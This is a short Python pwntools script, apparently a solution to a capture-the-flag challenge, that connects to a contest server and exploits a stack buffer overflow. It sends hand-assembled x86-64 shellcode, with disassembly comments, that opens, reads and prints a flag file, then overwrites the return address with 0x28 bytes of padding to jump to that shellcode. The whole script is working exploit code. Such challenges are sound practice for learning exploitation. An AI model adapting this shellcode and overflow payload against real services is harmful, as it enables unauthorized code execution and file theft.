from pwn import *

# r = remote('localhost', 5566)
r = remote('pre-exam-pwn.ais3.org', 10001)

# shellcode
# 0x6010b0: 48 c7 c0 02 00 00 00    mov    rax,0x2
# 0x6010b7: 48 c7 c7 a0 10 60 00    mov    rdi,0x6010a0
# 0x6010be: 48 31 f6                xor    rsi,rsi
# 0x6010c1: 48 31 d2                xor    rdx,rdx
# 0x6010c4: 0f 05                   syscall
# 0x6010c6: 48 89 c7                mov    rdi,rax
# 0x6010c9: 48 31 c0                xor    rax,rax
# 0x6010cc: 48 c7 c6 f0 10 60 00    mov    rsi,0x6010f0
# 0x6010d3: 48 c7 c2 40 00 00 00    mov    rdx,0x40
# 0x6010da: 0f 05                   syscall
# 0x6010dc: 48 c7 c7 f0 10 60 00    mov    rdi, 0x6010f0
# 0x6010e3: e8 18 f6 df ff          call   0x400700 <puts@plt>
# size: 56 bytes
shellcode = '\x48\xc7\xc0\x02\x00\x00\x00\x48\xc7\xc7\xa0\x10\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\xc7\xc6\xf0\x10\x60\x00\x48\xc7\xc2\x40\x00\x00\x00\x0f\x05\x48\xc7\xc7\xf0\x10\x60\x00\xe8\x18\xf6\xdf\xff'

# filename
# /home/orw/flag + padding
# size: 16 bytes
filename = '\x2f\x68\x6f\x6d\x65\x2f\x6f\x72\x77\x2f\x66\x6c\x61\x67\x00\x00'
payload1 = filename + shellcode

# bof
payload2 = 'a'*0x28 + p64(0x00000000006010b0)

r.sendline(payload1)
r.sendline(payload2)
r.interactive()
